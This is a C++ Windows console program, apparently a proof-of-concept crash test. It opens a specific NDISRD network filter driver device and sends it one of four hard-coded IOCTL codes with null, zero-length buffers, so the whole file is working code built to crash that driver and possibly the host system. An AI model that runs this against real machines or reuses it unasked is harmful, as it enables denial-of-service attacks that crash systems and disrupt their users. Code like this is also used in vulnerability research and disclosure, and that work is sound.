// crashtest.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

int DeviceCOntrolCodeTest(LPCTSTR deviceName, DWORD ControlCode)
{
	HANDLE m_handle = 0;
	DWORD nbBytes = 0;
	m_handle = CreateFile(deviceName, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, 0);

	if (m_handle != INVALID_HANDLE_VALUE)
	{
		std::cout << "Succesfully opened" << deviceName << ". Testing 0x" << std::hex << ControlCode << std::endl;
		DeviceIoControl(m_handle, ControlCode, (LPVOID)0, 0x0, (LPVOID)0, 0x0, &nbBytes, NULL);
		CloseHandle(m_handle);
	}
	else
	{
		std::cout << "Failed to open " << deviceName << ". You may need to start as Administrator." << std::endl;
		return -1;
	}

	std::cout << "Testing " << deviceName << " for 0x" <<  std::hex << ControlCode << std::endl;
	return 0;
}

int main()
{
	do
	{
		std::cout << "The following control codes are available to send to NDISRD.34C6BA7F-281D-40DF-ADD3-E792EB27E4CD:" << std::endl << std::endl;

		std::cout << "1) 0x830020E0" << std::endl;
		std::cout << "2) 0x830020E4" << std::endl;
		std::cout << "3) 0x830020F8" << std::endl;
		std::cout << "4) 0x8300210C" << std::endl;
		std::cout << "5) Exit" << std::endl;

		size_t index = 0;

		std::cout << std::endl << "Select one:";
		std::cin >> index;

		if ((index < 0) || (index > 5))
			std::cout << "No such test is available" << std::endl;

		switch (index)
		{
		case 1:
			DeviceCOntrolCodeTest(_T("\\\\.\\NDISRD.34C6BA7F-281D-40DF-ADD3-E792EB27E4CD"), 0x830020E0);
			break;
		case 2:
			DeviceCOntrolCodeTest(_T("\\\\.\\NDISRD.34C6BA7F-281D-40DF-ADD3-E792EB27E4CD"), 0x830020E4);
			break;
		case 3:
			DeviceCOntrolCodeTest(_T("\\\\.\\NDISRD.34C6BA7F-281D-40DF-ADD3-E792EB27E4CD"), 0x830020F8);
			break;
		case 4:
			DeviceCOntrolCodeTest(_T("\\\\.\\NDISRD.34C6BA7F-281D-40DF-ADD3-E792EB27E4CD"), 0x8300210C);
			break;
		case 5:
			return 0;
		default:
			continue;
		}

	} while (true);

    return 0;
}

